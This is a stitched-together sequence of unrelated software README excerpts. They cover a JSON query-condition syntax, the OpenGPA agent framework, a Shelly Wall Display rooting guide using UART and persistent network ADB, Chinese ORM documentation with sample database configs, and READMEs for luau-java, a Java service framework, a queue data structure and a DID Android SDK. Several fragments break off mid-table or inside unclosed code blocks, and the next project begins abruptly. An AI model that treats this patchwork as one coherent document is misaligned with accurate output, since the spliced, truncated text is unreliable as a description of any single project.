Whether you need this condition in the API, Service Layer or Infrastructure Layer.

The Structure:
    It can have one of these two forms:

    1. LHS/RHS format:
    {
        ""op"": ...,
        ""lhs"": ...,
        ""rhs"": ...        
    }

    This is used with Binary operators, where:
    op: operator type ( <, =, <=, >, >=, !=, like )
    lhs: left hand side, should be the entity field name.
    rhs: right hand side, should be the value

    example1:
    {
        ""op"": ""like"",
        ""lhs"": ""title"",
        ""rhs"": ""%Harry Potter%""
    }
    => all entities which have a title similar to the form: %Harry Potter%

    example2:
    {
        ""op"": "">"",
        ""lhs"": ""age"",
        ""rhs"": 18
    }
    => all entities which have an age higher than 18

    If the type of the rhs is not scalar, you need to provide a hint what is it through the ""type"" key.
    for example:

    example3:
    {
        ""op"": "">"",
        ""lhs"": ""publishDate"",
        ""rhs"": ""2009-01-01"",
        ""type"": ""Date""
    }
    => all entities whose publishDate is after 2009-01-01

    2. RANGE format:
    This is used with Ternary operators, where:
    op: operator type ( between )
    lhs: left hand side, should be the entity field name.
    range1: the start of the range
    range2: the end of the range
    
    example4:
    {
        ""op"": ""between"",
        ""lhs"": ""deathDate"",
        ""range1"": ""1999-06-01"",
        ""range2"": ""2003-12-01"",
        ""type"": ""Date""
    }
    => all entities whose deathDate is in the range inclusive [1999-06-01 , 2003-12-01]

    example5:
    {
        ""op"": ""between"",
        ""lhs"": ""age"",
        ""range1"": 18,
        ""range2"": 28
    }
    => all entities whose age is in the range inclusive [18, 28]

    example6:
    {
        ""op"": ""&&"",
        ""lhs"": {
            ""op"": ""between"",
            ""lhs"": ""publishDate"",
            ""range1"": ""1999-06-01"",
            ""range2"": ""2003-12-01"",
            ""type"": ""Date""
        },
        ""rhs"": {
            ""op"": ""||"",
            ""lhs"": {
                ""op"": ""like"",
                ""lhs"": ""name"",
                ""rhs"": ""% of %""
            },
            ""rhs"": {
                ""op"": "">"",
                ""lhs"": ""noPages"",
                ""rhs"": 800
            }
        }
    }
    => all entities that:
            has been published in the range inclusive [1999-06-01 , 2003-12-01]
            and 
                either 
                       its name is similar to the token "" of "" 
                    or its number of pages is more than 800

    example7
    {
        ""op"": ""="",
        ""lhs"": ""books.title"",
        ""rhs"": ""Artificial Intelligence""
    }
    
    => All the authors who authored the book of title: 'Artificial Intelligence'
    Notice that the Author has a relation Many To Many to Book entity 
    and there is a list inside the Author called books
    This will allow you to query for nested entities inside the root entity
    The nesting level is infinite as long as there is a relation.

**OpenGPA** is an Open-source General Purpose Agent. A self-hosted solution boasting capabilities similar to
popular GPTs.

- Agentic system with multi-step-reasoning, chain-of-thought, ReAct, tool use etc
- Support for [all major LLMs](https://docs.spring.io/spring-ai/reference/api/chatmodel.html) such as LLama, Mistral, Anthropic, OpenAI, etc.
- Off-line first. You can run on your own box with a local LLM. Data won't leave the server. All the power of GPT without the data privacy nightmare.
- Extensible framework allows to plug your own actions, such as calling into internal services and APIs
- Simple UI exposing insight on the GPA internal reasoning and actions
- Built-in RAG to search internal document stores
- Free and open source, deploy anywhere, customize to your needs

<p align=""center"">
  <img src=""/assets/opengpa_ui.png"" width=""640"" />
</p>

## :pencil2: Design principles

OpenGPA is much more than a UI on top of a LLM. It implements an agentic workflow, where a LLM is used as the 
*brain* of an agent to reason through multiple steps of planning, reasoning, and tool use.  In particular, OpenGpa 
is using the [ReAct](https://arxiv.org/abs/2210.03629) approach to verbally reason on the next step, decide on the action to execute, 
and observe the outcome.

```
{
  ""reasoning"": ""The user wants to know the current weather in Liege, Belgium. 
                The best action to get this information is to perform a web search with 
                the query 'current weather in Liege, Belgium'. The result of this action 
                will then be used to respond to the user's request. 
                This is not the final action as we have to get the results from the web 
                search first.""
  ""action"": {
    ""name"": ""webSearch"",
    ""arguments"": {
      ""query"": ""current weather in Liege, Belgium""
    }
  },
  ""is_final"": false
}
```

Action selection is based on a catalog of action that can easily be extended through code. You could add an action
to tap into an internal service to fetch some data, or a workflow engine to trigger a next step, etc.

## 🛠️️ Key Features

The current version is a minimal POC yet, it already packs a few interesting pieces:
- Works with all LLM supported by [spring-ai](https://spring.io/projects/spring-ai), including running **LLama** locally
- Multi-step task processing with **chain-of-thought** approach
- Action model with easy to extend **actions** for use by the agent
- Upload of **artifacts** to process by the agent
- Download of **artifacts** generated by the agent
- Import documents in knowledge base to support RAG search

## 🚧 Roadmap

Improve the Agentic capabilities:
- ✅ **RAG** enabling the agent to consult vast volume of internal documents
- **Memory** enabling the agent to remember key facts and use them later
- **code generation** and **execution** within the agent (using Groovy scripts?)
- **remote API invocation** to tap into existing enterprise APIs
- **web interactions** allowing the agent to navigate pages submit forms
- **scheduled** jobs for automating workflow
- **triggers** to create complete end-to-end workflows

Make OpenGPA enterprise ready:
- Persistence of tasks/steps
- Proper file storage and management
- User management and access control
- Secure API access through API gateway
- Auditing of task processing costs (token usage)
- Instrumentation and observability

## 🚀 Getting started

### Build and run the server

If you are on a Mac, the following should be enough to get you started and running this
locally. In case of trouble, please reach out on [Discord](https://discord.gg/3XPsmCRNE2). 

> [!WARNING]
> Building requires __Java 21__. If you are on a Mac, you can easily install it
> with `brew install openjdk@21`

By default, opengpa is using OpenAI gpt-4o as its LLM. Check the `application.properties` file 
for configuration options and the spring-ai documentation to configure support for other LLMs.

```bash
mvn clean package -Pproduction
OPENAI_API_KEY=sk-*** java -jar opengpa-server/target/opengpa-server-0.2.0.jar
```

Open the UI on [http://localhost:8000](http://localhost:8000) and login with username `opengpa` and password `opengpa`.


### Debugging

For debugging purposes you can log all interactions and prompts using the following config:
```
opengpa.server.log-prompt=true
opengpa.server.log-folder=/tmp/opengpa/logs
```

Shelly Elevate is an app designed for the Shelly Wall Display, codenamed Stargate, that hosts a NanoHTTPD REST server as a background service upon booting. It automatically launches Chrome with Home Assistant, if available. The README provides a detailed tutorial on hacking your device, installing a launcher, setting up Chrome, configuring Shelly Elevate, and integrating it with Home Assistant.<br>
Video: https://github.com/user-attachments/assets/d6095593-97f1-4036-b6d5-d9b3466c385f
## Hacking your Wall Display
There are two different methods to jailbreak your wall display, and you'll need to choose one:
* **UART**: This method is highly reliable, with nearly a 100% success rate. However, it requires soldering cables to your device and purchasing an inexpensive [USB2UART](https://aliexpress.com/item/32694152202.html) adapter.
* **MTKClient**: Although this method didn't work for me, it has been successful for others in the community. But it **can** work for you. It also doesnt require soldering.**TODO**

### Using UART
#### Install the required Software
* To interact with the UART2USB adapter, download a software like [PuTTY](https://www.putty.org).

* Obtain the [Anroid plattform tools](https://developer.android.com/tools/releases/platform-tools) for necessary interactions with your device.

* From the release tab, download the latest versions of the ShellyElevate APK, Chrome APK, and the ultra-small launcher APK.

#### Disassembly and Soldering
##### 1. Remove Backplate:
* Remove the four screws holding the backplate in place and store them safely.<br>
<img src=""https://github.com/RapierXbox/ShellyElevate/assets/65401386/9e2cd91a-49cb-4e09-ba2c-795ce61a37f5"" width=350><img/>
* Lift the backplate cautiously and disconnect the FPC cable from the motherboard.<br>

(**NOTE:** I accidentally switched up 3v3 and rx in this picture but you should get the idea.)
#### Connect to your Display
##### 1. Connect to UART Adapter:
* Connect to your UART adapter at 921600bps.
##### 2. Get root access:
* In the shell, type `su` to get root access.
##### 3. Enable ADB:
* Execute the following commands to enable ADB permanently: <br>
`settings put global development_settings_enabled 1` <br>
`settings put global adb_enabled 1`<br>
`setprop persist.adb.tcp.port 5555`<br>
`setprop service.adb.tcp.port 5555`<br>
`stop adbd`<br>
`start adbd`<br>
##### 4. Get IP Address:
* Obtain your IP address by typing `ifconfig`.
##### 5. Connect via ADB:
* On your computer, navigate to the platform tools directory and connect using: `./adb connect <your ip>:5555`
##### 6. Disable Shelly App:
* Disable the Shelly app with: `./adb root` <br>
`./adb shell pm disable cloud.shelly.stargate`<br>
##### 7. Install Launchers and Apps:
* Install the ultra-small launcher: `./adb install ultra-small-launcher.apk`
* Install Chrome and the ShellyElevate app: <br>
`./adb install Chrome.apk` <br>
`./adb install -g ShellyElevate.apk`
##### 8. Reboot and Launch
* Reboot the device with: `./adb shell reboot`
* After rebooting, Chrome should open with your Home Assistant instance. It can take up to one minute if your wifi doesnt connect!
##### 9. Troublshooting:
* To return to the home screen, use: `./adb shell input keyevent 3`
## Configuration in Home Assistant
* In your configuration.yaml file add this:
```
switch:
  - platform: rest
    name: Relay Shelly Walldisplay
    resource: http://<your ip>:8080/relay
    body_on: ""true""
    body_off: ""false""
    is_on_template: ""{{ value_json.state }}""
    headers:
      Content-Type: application/json
    scan_interval: 10

2. 配置config和yml

   ```yml
   # 这个名称与config类中的@Inject(""${ds1}"")对应
   ds1:
     type: com.zaxxer.hikari.HikariDataSource
     jdbcUrl: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
     driverClassName: com.mysql.cj.jdbc.Driver
     username: root
     password: root
   # 这个名称与config类中的@Inject(""${ds2}"")对应
   ds2:
     type: com.zaxxer.hikari.HikariDataSource
     jdbcUrl: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
     driverClassName: com.mysql.cj.jdbc.Driver
     username: root
     password: root
   # 这个名称与config类中的@Inject(""${ds3}"")对应
   ds3:
     type: com.zaxxer.hikari.HikariDataSource
     jdbcUrl: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
     driverClassName: com.mysql.cj.jdbc.Driver
     username: root
     password: root

   # 这个名称与config类中的@Inject(""${dynamic}"")对应
   # 多数据源
   dynamic:
     type: com.zaxxer.hikari.HikariDataSource
     strict: true #严格模式（指定的源不存时：严格模式会抛异常；非严格模式用默认源）
     default: db_user_1 #指定默认数据源
     db_user_1:
       schema: db_user
       jdbcUrl: jdbc:mysql://localhost:3306/db_user?useUnicode=true&characterEncoding=utf8&autoReconnect=true&rewriteBatchedStatements=true
       driverClassName: com.mysql.cj.jdbc.Driver
       username: root
       password: 123456
     db_user_2:
       schema: db_user
       jdbcUrl: jdbc:mysql://localhost:3307/db_user?useUnicode=true&characterEncoding=utf8&autoReconnect=true&rewriteBatchedStatements=true
       driverClassName: com.mysql.cj.jdbc.Driver
       username: root
       password: 123456

   drink:
     # 这个名称代表了ioc容器中Client对象bean的别名，通过@Inject(""main"")注入到你想要的地方，下同
     main:
       database: MySQL
       # 这里需要一个config类中定义的的数据源的bean的别名，下同
       dsName: normalDs1
     sub:
       database: SqlServer
       dsName: normalDs2
     readonly:
       database: H2
       dsName: normalDs3
     dynamic:
       database: H2
       dsName: dynamicDs
   ```

   ```java
   package io.github.kiryu1223.app.config;

   import com.zaxxer.hikari.HikariDataSource;
   import org.noear.solon.annotation.Bean;
   import org.noear.solon.annotation.Configuration;
   import org.noear.solon.annotation.Inject;
   import org.noear.solon.data.dynamicds.DynamicDataSource;

   import javax.sql.DataSource;

   @Configuration
   public class MyConfig
   {
       @Bean(""normalDs1"")
       public DataSource dataSource1(@Inject(""${ds1}"") HikariDataSource dataSource)
       {
           return dataSource;
       }

       @Bean(""normalDs2"")
       public DataSource dataSource2(@Inject(""${ds2}"") HikariDataSource dataSource)
       {
           return dataSource;
       }

       @Bean(""normalDs3"")
       public DataSource dataSource3(@Inject(""${ds3}"") HikariDataSource dataSource)
       {
           return dataSource;
       }

       @Bean(""dynamicDs"")
       public DataSource dataSource4(@Inject(""${dynamic}"") DynamicDataSource dataSource)
       {
           return dataSource;
       }
   }
   ```

   注意，在只配了一个client对象的情况下，使用`@inject`注解在service或者你想要的地方注入Client对象时，不需要填入别名（否则会找不到报错）

## 常用的注解

`Table`：用于表示表名的注解

| 字段     | 类型     | 默认值 | 说明               |
|--------|--------|-----|------------------|
| schema | String | 无   | 表的所属,为空时表示为默认的所属 |
| value  | String | 无   | 表名，为空时表示类名等于表名   |

`Column`：用于表示列名的注解

| 字段         | 类型                                  | 默认值               | 说明                                            |
|------------|-------------------------------------|-------------------|-----------------------------------------------|
| primaryKey | boolean                             | false             | 是否为主键                                         |
| value      | String                              | 无                 | 字段对应的列名，为空时等于字段名                              |
| converter  | Class\<? extends IConverter\<?, ?>> | NoConverter.class | 转换器，用于列类型与java类型不一致的情况（比如数据库枚举<=>java枚举）,默认为无 |

`Navigate`：用于表示关联关系的注解

| 字段            | 类型                             | 默认值                 | 说明                                      |
|---------------|--------------------------------|---------------------|-----------------------------------------|
| value         | RelationType                   | 无                   | 用于表示当前类与目标类的关联关系，有四种关系（一对一，一对多，多对一，多对多） |
| self          | String                         | 无                   | 自身类的关联关系的java字段名                        |
| target        | String                         | 无                   | 目标类的关联关系的java字段名                        |
| mappingTable  | Class<? extends IMappingTable> | IMappingTable.class | 多对多下必填,中间表，需要继承IMappingTable            |
| selfMapping   | String                         | 无                   | 多对多下必填,自身类对应的mappingTable表java字段名       |
| targetMapping | String                         | 无                   | 多对多下必填,目标类对应的mappingTable表java字段名       |

`IgnoreColumn`：用于表示字段与表无关的注解

## CRUD

所有的增删查改操作都由DrinkClient对象完成（以下简称为client）

以下是主要使用的api

| 方法     | 参数             | 返回     |
|--------|----------------|--------|
| query  | 数据库表对应对象的class | 查询过程对象 |
| insert | 一个或者多个相同的表对应对象 | 新增过程对象 |
| update | 数据库表对应对象的class | 更新过程对象 |
| delete | 数据库表对应对象的class | 删除过程对象 |

### 查询

查询由client对象的query方法发起，query方法接收一个class对象，返回一个查询过程对象，
可以在后续调用`where` `group by` `limit`等方法添加查询条件

以下是常用的查询过程的api

| 方法          | 参数                                            | 返回                        | 说明                                                                                                                                                                            |

假设我们有一个员工表

```java

@Data
@Table(""employees"")
public class Employee
{
    //员工id
    @Column(""emp_no"")
    private int number;
    //生日
    @Column(""birth_date"")
    private LocalDate birthDay;
    @Column(""first_name"")
    private String firstName;
    @Column(""last_name"")
    private String lastName;
    //性别
    @Column(converter = GenderConverter.class)
    private Gender gender;
    //入职日期
    @Column(""hire_date"")
    private LocalDate hireDay;
}
```

根据id获得员工对象

```java
public class DisplayTest extends BaseTest
{
    public void d1()
    {
        int id = 10001;
        List<Employee> list = client.query(Employee.class) // FROM `employees` AS t0
                .where(e -> e.getNumber() == id) // WHERE t0.`emp_no` = ?
                // 因为没有select，默认选择了全字段 
                // SELECT t0.`birth_date`,t0.`first_name`,t0.`last_name`,t0.`emp_no`,t0.`hire_date`,t0.`gender`
                .toList();
    }
}
```

对应的sql

```mysql
SELECT t0.`birth_date`, t0.`first_name`, t0.`last_name`, t0.`emp_no`, t0.`hire_date`, t0.`gender`
FROM `employees` AS t0
WHERE t0.`emp_no` = ?
```

根据firstName和性别获得员工对象

```java
public class DisplayTest extends BaseTest
{
    public void d2()
    {
        List<Employee> list = client.query(Employee.class) // FROM `employees` AS t0
                .where(e -> e.getGender() == Gender.F && e.getFirstName() == ""lady"") // WHERE t0.`gender` = ? AND t0.`first_name` = ?
                // 因为没有select，默认选择了全字段 
                // SELECT t0.`birth_date`, t0.`first_name`, t0.`last_name`, t0.`emp_no`, t0.`hire_date`, t0.`gender`
                .toList();
    }
}
```

对应的sql

```mysql
SELECT t0.`birth_date`, t0.`first_name`, t0.`last_name`, t0.`emp_no`, t0.`hire_date`, t0.`gender`
FROM `employees` AS t0
WHERE t0.`gender` = ?
  AND t0.`first_name` = ?
```

假设我们还有一张员工薪资历史表

```java

@Data
@Table(""salaries"")
public class Salary
{
    //员工id
    @Column(""emp_no"")
    private int empNumber;
    //薪资
    private int salary;
    //何时开始的
    @Column(""from_date"")
    private LocalDate from;
    //何时为止的
    @Column(""to_date"")
    private LocalDate to;
}
```

查询一个员工的姓名和历史最高薪资和平均薪资

```java
public class DisplayTest extends BaseTest
{
    public void d3()
    {
        int id = 10001;
        List<? extends Result> list = client.query(Employee.class) // FROM `employees` AS t0
                .leftJoin(Salary.class, (e, s) -> e.getNumber() == s.getEmpNumber()) // LEFT JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
                .where((e, s) -> e.getNumber() == id) // WHERE t0.`emp_no` = ?
                // SELECT
                .select((e, s) -> new Result()
                {
                    // CONCAT(t0.`first_name`, ?, t0.`last_name`) AS `name` 
                    String name = SqlFunctions.concat(e.getFirstName(), "" "", e.getLastName());
                    // MAX(t1.`salary`)                           AS `maxSalary`,
                    int maxSalary = SqlFunctions.max(s.getSalary());
                    // AVG(t1.`salary`)                           AS `avgSalary`
                    BigDecimal avgSalary = SqlFunctions.avg(s.getSalary());
                })
                .toList();
    }
}
```

对应的sql

```mysql
SELECT CONCAT(t0.`first_name`, ?, t0.`last_name`) AS `name`,
       MAX(t1.`salary`)                           AS `maxSalary`,
       AVG(t1.`salary`)                           AS `avgSalary`
FROM `employees` AS t0
         LEFT JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
WHERE t0.`emp_no` = ?
```

假设我们还有部门表和员工部门中间表

```java

@Table(""departments"")
@Data
public class Department
{
    // 部门编号
    @Column(""dept_no"")
    private String number;
    // 部门名称
    @Column(""dept_name"")
    private String name;
}
```

```java

@Data
@Table(""dept_emp"")
public class DeptEmp
{
    // 员工编号
    @Column(""emp_no"")
    private int empNumber;
    // 部门编号
    @Column(""dept_no"")
    private String deptNumber;
    // 什么时候加入的
    @Column(""from_date"")
    private LocalDate from;
    // 什么时候离开的
    @Column(""to_date"")
    private LocalDate to;
}
```

查询某部门的员工的平均薪水

```java
public class DisplayTest extends BaseTest

    {
        String departmentId = ""d009"";

        List<? extends Result> list = client.query(DeptEmp.class) // FROM `dept_emp` AS t0
                .innerJoin(Salary.class, (de, s) -> de.getEmpNumber() == s.getEmpNumber()) // INNER JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
                .innerJoin(Department.class, (de, s, d) -> de.getDeptNumber() == d.getNumber()) // INNER JOIN `departments` AS t2 ON t0.`dept_no` = t2.`dept_no`
                .where((de, s, d) -> de.getDeptNumber() == departmentId && s.getTo() == LocalDate.of(9999, 1, 1)) // WHERE t0.`dept_no` = ? AND t1.`to_date` = ?
                // GROUP BY 
                .groupBy((de, s, d) -> new Grouper()
                {
                    // t0.`dept_no`, 
                    String id = de.getDeptNumber();
                    // t2.`dept_name`
                    String name = d.getName();
                })
                // SELECT
                .select(g -> new Result()
                {
                    // t0.`dept_no` AS `deptId`
                    String deptId = g.key.id;
                    // t2.`dept_name` AS `deptName`
                    String deptName = g.key.name;
                    // AVG(t1.`salary`) AS `avgSalary`
                    BigDecimal avgSalary = g.avg((de, s, d) -> s.getSalary());
                })
                .toList();

### 新增

新增由client对象的insert方法发起，insert方法接收一个或多个数据库表对应的对象，
返回一个新增过程对象,可以对这个新增过程对象后续进行insert方法添加更多数据

| 方法          | 参数           | 返回      | 说明             |
|-------------|--------------|---------|----------------|
| insert      | 同类型单个对象或对象集合 | this    | 添加更多需要传入数据库的对象 |
| executeRows |              | 执行成功的数量 | 执行insert       |

> 注意：insert根据数量自动选择批量执行（数量>=2）

Department表新增一个数据

```java
public class DisplayTest extends BaseTest
{
    public void i1()
    {
        Department department = new Department();
        department.setNumber(""101"");
        department.setName(""ddd"");

        client.insert(department).executeRows();
    }
}
```

新增多个数据

```java
public class DisplayTest extends BaseTest
{
    public void i2()
    {
        Department department1 = new Department();
        department1.setNumber(""101"");
        department1.setName(""ddd"");
        Department department2 = new Department();
        department2.setNumber(""102"");
        department2.setName(""eee"");
        Department department3 = new Department();
        department3.setNumber(""103"");
        department3.setName(""fff"");

        List<Department> list = Arrays.asList(department1, department2, department3);

        client.insert(list).executeRows();
    }
}
```

新增任意数据

```java
public class DisplayTest extends BaseTest
{
    public void i3()
    {
        Department d = new Department();

        Department department1 = new Department();
        department1.setNumber(""101"");
        department1.setName(""ddd"");
        Department department2 = new Department();
        department2.setNumber(""102"");
        department2.setName(""eee"");
        Department department3 = new Department();
        department3.setNumber(""103"");
        department3.setName(""fff"");

        List<Department> ds = Arrays.asList(department1, department2, department3);

        client.insert(d).insert(ds).executeRows();
    }
}
```

### 更新

更新由client对象的update方法发起，update方法接收一个class对象，返回一个更新过程对象，
可以对这个对象后续进行`set`设置数据和`where`限制更新范围等操作

| 方法                   | 参数               | 返回       | 说明                       |
|----------------------|------------------|----------|--------------------------|
| left/right/innerJoin | 同查询过程对象的leftJoin | 新的更新过程对象 | 用于连表更新，操作方式与查询时的join方法一致 |
| set                  | lambda表达式        | this     | 设置更新数据的lambda表达式         |
| where                | 同查询过程对象的where    | this     | 同查询过程对象的where            |

> 警告：进行无where限制下的update时默认会报错，需要手开启无视无where限制

为Department表更新数据

```java
public class UpdateTest extends BaseTest
{
    public void display0()
    {
        long l2 = client.update(Department.class)
                .set(s -> s.setName(""newName""))
                .where(w -> w.getNumber() == ""100"")
                .executeRows();
    }
}
```

对应sql

```mysql
UPDATE `departments` AS t0
SET t0.`dept_name` = ?
WHERE t0.`dept_no` = ?
```

连表更新

```java

@SuppressWarnings(""all"")
public class UpdateTest extends BaseTest
{
    long l = client.update(Department.class)
            .leftJoin(DeptEmp.class, (a, b) -> a.getNumber() == b.getDeptNumber())
            .set((a, b) -> a.setName(b.getDeptNumber()))
            .where((a, b) -> 1 == 1)
            .executeRows();
}
```

对应sql

```mysql
UPDATE `departments` AS t0 LEFT JOIN `dept_emp` AS t1 ON t0.`dept_no` = t1.`dept_no`
SET t0.`dept_name` = t1.`dept_no`
WHERE ? = ?
```

### 删除

删除由client对象的delete方法发起，delete方法接收一个class对象，返回一个删除过程对象，
可以对这个对象后续进行`where`限制更新范围等操作

| 方法                   | 参数                      | 返回       | 说明                                                |
|----------------------|-------------------------|----------|---------------------------------------------------|
| left/right/innerJoin | 同查询过程对象的leftJoin        | 新的删除过程对象 | 用于连表删除，操作方式与查询时的join方法一致                          |
| where                | 同查询过程对象的where           | this     | 同查询过程对象的where                                     |
| selectDelete         | 返回需要删除的目标表的对象的lambda表达式 | this     | join后连表删除时可以使用，用于指定需要删除的表，可以通过多次调用增加目标（无调用默认选择全部） |

> 警告：进行无where限制下的delete时默认会报错，需要手开启无视无where限制

为Department表删除数据

```java
public class DeleteTest extends BaseTest
{
    @Test
    public void d1()
    {
        long executeRows = client.delete(Department.class)
                .where(w -> w.getNumber() == ""10009"")
                .executeRows();
    }
}
```

对应sql

```mysql
DELETE
FROM `departments` AS t0
WHERE t0.`dept_no` = ?
```

连表删除

```java
public class DeleteTest extends BaseTest
{
    @Test
    public void d2()
    {
        String sql = client.delete(Department.class)
                .leftJoin(DeptEmp.class, (d, dm) -> d.getNumber() == dm.getDeptNumber())
                .where((d, dm) -> d.getNumber() == ""d009"")
//                .selectDeleteTable((d, dm) -> d)
                .selectDelete((d, dm) -> dm)
                .toSql();
        System.out.println(sql);
    }
}
```

对应sql

```mysql
DELETE t1
FROM `departments` AS t0
         LEFT JOIN `dept_emp` AS t1 ON t0.`dept_no` = t1.`dept_no`
WHERE t0.`dept_no` = ?
```

## 关联查询 INCLUDE

假设我们有一个工资类和一个员工类，员工类配置了对工资类的关联信息，员工与工资是一对多关系（一个员工有多个工资信息）

```java

@Data
@Table(value = ""salaries"")
public class Salary
{
    @Column(value = ""emp_no"", primaryKey = true)
    private int empNumber;
    private int salary;
    @Column(""from_date"")
    private LocalDate from;
    @Column(""to_date"")
    private LocalDate to;
}

@Data
@Table(""employees"")
public class Employee
{
    @Column(value = ""emp_no"", primaryKey = true)
    private int number;
    @Column(""birth_date"")
    private LocalDate birthDay;
    @Column(""first_name"")
    private String firstName;
    @Column(""last_name"")
    private String lastName;
    @Column(converter = GenderConverter.class)
    private Gender gender;
    @Column(""hire_date"")
    private LocalDate hireDay;
    // 一对多，self为自身的number字段，target为Salary的empNumber字段
    @Navigate(value = RelationType.OneToMany, self = ""number"", target = ""empNumber"")
    private List<Salary> salaries;
}
```

现在我们就可以填充指定的员工的工资信息

```java
public class IncludeTest extends BaseTest
{
    @Test
    public void oneManyTest()
    {
        //获取编号为10001的员工并且查询出该员工的所有工资信息
        Employee employee = client.query(Employee.class)
                .where(e -> e.getNumber() == 10001)
                .includes(e -> e.getSalaries())
                .first();

        Assert.assertEquals(17, employee.getSalaries().size());
    }
}
```

我们也可以对这个查询做出限制

```java
public class IncludeTest extends BaseTest
{
    @Test
    public void oneManyCondTest()
    {
        //获取编号为10001的员工并且查询出该员工最后一次调整工资（9999-01-01）以外的历史工资
        Employee employee = client.query(Employee.class)
                .where(e -> e.getNumber() == 10001)
                .includes(e -> e.getSalaries(), s -> s.getTo().isBefore(LocalDate.of(9999, 1, 1)))
                .first();

        Assert.assertEquals(16, employee.getSalaries().size());
    }
}
```

也支持更复杂的限制条件，比方说限制关联查询获取的条目数

```java
public class IncludeTest extends BaseTest
{
    @Test
    public void oneManyCond2Test()
    {
        //获取编号为10001的员工并且查询出该员工最后一次调整工资（9999-01-01）以外的历史工资
        //同时只获取前10条
        //并且按工资排序
        Employee employee = client.query(Employee.class)
                .includesByCond(e -> e.getSalaries(), query -> query
                        .orderBy(s -> s.getSalary())
                        .where(s -> s.getTo().isBefore(LocalDate.of(9999, 1, 1)))
                        .limit(10)
                )
                .first();

        Assert.assertEquals(10, employee.getSalaries().size());
    }
}
```

hollow-cube/luau-java,main,"# Luau (for Java)

[![license](https://img.shields.io/github/license/hollow-cube/luau-java.svg)](LICENSE)

Low level bindings for [Luau](https://luau-lang.org).

## Why Luau?

There is a lot of prior art for interacting with Lua to/from Java:

* [LuaJ](https://github.com/luaj/luaj) (and its many forks)
* [luajava](https://github.com/jasonsantos/luajava) (and its many forks)
* [LuaTruffle](https://github.com/lucasallan/LuaTruffle) for GraalVM

However, these solutions generally do not have strong sandboxing guarantees (or track record), or lose much of the
performance benefit of Lua. Enter Luau. It has been proven at Roblox to be performant, well sandboxed, and easier to
use through its introduction of progressive typing.

## Install

`luau-java` and the associated native libraries are all available
on [maven central](https://search.maven.org/search?q=g:dev.hollowcube%20AND%20a:luau-java). All projects must depend on
the main luau artifact, as well as at least one of the platform specific natives. It is valid to depend on multiple
natives artifacts at the same time, they will not conflict.

> [!IMPORTANT]  
> `luau-java` uses the
> new [Foreign Function and Memory API](https://openjdk.org/jeps/442) (FFM) introduced as a preview feature in Java 21.
> This means that you will be required to enable preview features when using `luau-java`. This can be done by
> adding `--enable-preview` and `--enable-native-access=ALL-UNNAMED` to your JVM arguments.

Replace `${platform}` and `${version}` with one of the following entries. Note that the core library version may be
different from the native library version.

## Usage

A hello world print from Luau would look something like the following:

```java
public class HelloWorld {
    public static void main(String[] args) throws LuauCompileException {
        final byte[] bytecode = LuauCompiler.DEFAULT.compile(""""""
                        print(""Hello, Luau!"")
                """""");

        final LuaState state = LuaState.newState();
        try {
            state.openLibs(); // Open all libraries
            state.sandbox(); // Sandbox the global state so it cannot be edited by a script

            var thread = state.newThread();
            thread.sandboxThread(); // Create a mutable global env for scripts to use

            thread.load(""helloworld.luau"", bytecode); // Load the script into the VM
            thread.pcall(0, 0); // Eval the script

            state.pop(1); // Pop the thread off the stack
        } finally {
            // Always remember to close the state when you're done with it, or you will leak memory.
            state.close();
        }
    }
}
```

The test sources contain library examples, which should help you to get started.

## Building from Source

Prerequisites: JDK 21+, CMake 3.15+, [JExtract](https://jdk.java.net/jextract/) (Only required to update bindings)

```shell
git clone git@github.com:hollow-cube/luau-java.git --recurse-submodules && cd luau-java
./gradlew build
```

### Updating Bindings

Bindings are generated using [JExtract](https://jdk.java.net/jextract/). They are already included in the repository
inside of `src/generated/java`. They may need to be updated as Luau is updated.

```shell
./gradlew jextract
```

### ✨ 项目说明

Bus (应用/服务总线) 是一个基础框架、服务套件，它基于Java17+ 编写，参考、借鉴了大量已有框架、组件的设计，可以作为后端服务的开发基础中间件。代码简洁，架构清晰，非常适合学习使用。

很开心地告诉大家这套组件上手和学习难度非常小。如果是以学会使用为目的，只要你会Java语言即可。之前做项目的时候，往往会遇到各种各样的问题，这些问题有可能是会遇到很多次，不善于总结沉淀，这是很多人的一个通病，包括我自己也是。

于是我就萌生了把这些问题沉淀成组件的想法，分享自己成长路线,当然也参考了部分开源项目，资料，文章进行整合的一个提供基础功能的项目。
本项目旨在实现基础能力，不设计具体业务，希望能帮助到大家，也让大家见证我的勤奋与努力，一起进步。

欢迎大家来 这里 踩踩,生命有限！少写重复代码！给颗星奖励下呗~

目标期望能努力打造一套从 基础框架 - 分布式微服务架构 - 持续集成 - 自动化部署 -系统监测等，快速实现业务需求的全栈式技术解决方案。

A new Queue data structure that inherits the positive properties of array-based Queues
while removing their main drawback: a fixed size.

The Queue is backed by arrays of Objects with exponentially growing sizes, of which all are in use,
but only the first one (with initialCapacity) is allocated up-front.

A detailed description is given in [Paper](https://MultiArrayQueue.github.io/Paper_MultiArrayQueue.pdf).
Performance figures are in the Paper as well.

## Development status

 * Currently (2024) this code is in its early stage and only for academic interest, not for production use.
 * Do not send me Pull Requests - the code is small so I want to maintain it single-handedly.
 * Reviews, tests and comments are welcome.

<br>
[Client SDK License-dependencies](https://github.com/OmniOneID/did-client-sdk-aos/blob/main/dependencies-license.md)

<br>

### How to apply the did-client-sdk-aos library to the DIDCA project in Android Studio:
1. Prepare the did-client-sdk-aos library

- If you do not have the above library files, you need to build them from the SDK repository to generate the jar files.
[Move to Client SDK](https://github.com/OmniOneID/did-client-sdk-aos)

2. Add the did-client-sdk-aos library

    a. Add jar files to the project
   - Open the project in Android Studio.
   - Create a `libs` folder under the `app` directory in the Project window. (Skip this step if the folder already exists.)
   - Copy the prepared jar files into the `libs` folder.

    b. Add jar files to the project dependencies
     - After copying the jar files to the `libs` folder, right-click each jar file in the Project window and select ""Add as Library...""
     - Android Studio will automatically add the jar files as project dependencies.

3. Modify the build.gradle file

    a. Modify the dependencies section
   - Open the build.gradle file for the app module, and add the following code to the dependencies section to include the `did-client-sdk-aos` library in the project:
    
    ```groovy
    dependencies {
        .
        .
        .
        implementation fileTree(dir: 'libs', include: ['*.jar'])
        
        implementation 'com.google.code.gson:gson:2.10.1'
        implementation 'androidx.biometric:biometric:1.1.0'
